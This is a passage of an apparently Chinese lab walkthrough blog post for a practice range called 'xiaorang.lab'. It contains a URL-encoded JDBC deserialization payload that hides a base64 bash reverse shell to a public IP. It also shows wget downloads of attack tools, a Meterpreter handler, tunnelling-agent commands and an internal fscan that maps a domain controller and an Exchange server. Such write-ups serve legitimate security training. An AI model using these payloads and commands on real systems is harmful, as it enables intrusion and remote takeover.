class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%34</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%39</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%36</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%59</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%46</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%53</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%69</span><span class="hljs-variable">%41</span><span class="hljs-variable">%76</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%32</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%33</span><span class="hljs-variable">%52</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%43</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%79</span><span class="hljs-variable">%34</span><span class="hljs-variable">%35</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%34</span><span class="hljs-variable">%79</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%38</span><span class="hljs-variable">%31</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%55</span><span class="hljs-variable">%77</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%77</span><span class="hljs-variable">%50</span><span class="hljs-variable">%69</span><span class="hljs-variable">%59</span><span class="hljs-variable">%78</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%44</span><span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%66</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%61</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%55</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%48</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%53</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%31</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%54</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure>
+
+<p>直接是root权限</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">cat /root/flag/flag01.txt<br><br> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ <br>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██<br> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ <br>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         <br>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████<br>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██<br> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ <br>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  <br><br>                        |<span class="hljs-string">  </span>|<span class="hljs-string">  </span>||<span class="hljs-string">  </span>|<span class="hljs-string"> /~~\  /\  </span>|<span class="hljs-string">\  /</span>|<span class="hljs-string">~</span>|<span class="hljs-string">~</span><br><span class="hljs-string">                        </span>|<span class="hljs-string">  </span>|<span class="hljs-string">  </span>||<span class="hljs-string">--</span>||<span class="hljs-string">    </span>|<span class="hljs-string">/__\ </span>|<span class="hljs-string"> \/ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span><br><span class="hljs-string">                         \/ \/ </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> \__//    \</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_</span>|_<br><br>flag01: flag&#123;9df584ea-34d7-4d2b-9b71-5b746b2c6e30&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><p>wget传马</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>公网IP:<span class="hljs-number">8000</span>/fscan<br>wget http:<span class="hljs-regexp">//</span>公网IP:<span class="hljs-number">8000</span><span class="hljs-regexp">/msf/m</span>b22<br>wget http:<span class="hljs-regexp">//</span>公网IP:<span class="hljs-number">8000</span>/linux_x64_agent<br>chmod +x linux_x64_agent mb22<br></code></pre></td></tr></table></figure>
+
+<p>加权限，上线msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 39.98.109.189<br><span class="hljs-built_in">set</span> LPORT 54522<br>run<br><br>./linux_x64_agent -l 54523 -s matrix<br><br>./linux_x64_admin -c 39.98.109.189:54523 -s matrix<br><br></code></pre></td></tr></table></figure>
+
+<p>看看网段，fscan扫一下</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:3e:<span class="hljs-number">34</span>:e1:e1  <br>          inet addr:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>  Bcast:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>          inet6 addr: fe80::<span class="hljs-number">216</span>:3eff:fe34:e1e1/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packets:<span class="hljs-number">951314</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          TX packets:<span class="hljs-number">752379</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          collisions:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          RX bytes:<span class="hljs-number">494361845</span> (<span class="hljs-number">494</span>.<span class="hljs-number">3</span> MB)  TX bytes:<span class="hljs-number">304273385</span> (<span class="hljs-number">304</span>.<span class="hljs-number">2</span> MB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  Mask:<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>          inet6 addr: ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> Scope:Host<br>          UP LOOPBACK RUNNING  MTU:<span class="hljs-number">65536</span>  Metric:<span class="hljs-number">1</span><br>          RX packets:<span class="hljs-number">30870</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          TX packets:<span class="hljs-number">30870</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          collisions:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1</span> <br>          RX bytes:<span class="hljs-number">14953460</span> (<span class="hljs-number">14</span>.<span class="hljs-number">9</span> MB)  TX bytes:<span class="hljs-number">14953460</span> (<span class="hljs-number">14</span>.<span class="hljs-number">9</span> MB)<br>          <br><br>./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><br><span class="hljs-number">172.22.3.2:88</span> open<br><span class="hljs-number">172.22.3.9:808</span> open<br><span class="hljs-number">172.22.3.9:139</span> open<br><span class="hljs-number">172.22.3.2:139</span> open<br><span class="hljs-number">172.22.3.26:135</span> open<br><span class="hljs-number">172.22.3.12:8000</span> open<br><span class="hljs-number">172.22.3.26:445</span> open<br><span class="hljs-number">172.22.3.9:445</span> open<br><span class="hljs-number">172.22.3.2:445</span> open<br><span class="hljs-number">172.22.3.9:443</span> open<br><span class="hljs-number">172.22.3.26:139</span> open<br><span class="hljs-number">172.22.3.9:135</span> open<br><span class="hljs-number">172.22.3.2:135</span> open<br><span class="hljs-number">172.22.3.9:81</span> open<br><span class="hljs-number">172.22.3.9:80</span> open<br><span class="hljs-number">172.22.3.12:80</span> open<br><span class="hljs-number">172.22.3.12:22</span> open<br><span class="hljs-number">172.22.3.9:8172</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">18</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN16<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-PC<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br><span class="hljs-string">[*]</span> OsInfo <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>   (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC          <br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      <span class="hljs-string">[+]</span> DC:XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-EXC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>   code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         code:<span class="hljs-number">403</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">19813</span>  title:lumia<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html code:<span class="hljs-number">200</span> len:<span class="hljs-number">5662</span>   title:Lumia ERP<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      code:<span class="hljs-number">403</span> len:<span class="hljs-number">1157</span>   title:<span class="hljs-number">403</span> - 禁止访问: 访问被拒绝。<br><span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<br><span class="hljs-string">[*]</span> WebTitle https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   code:<span class="hljs-number">404</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[*]</span> WebTitle https://<span 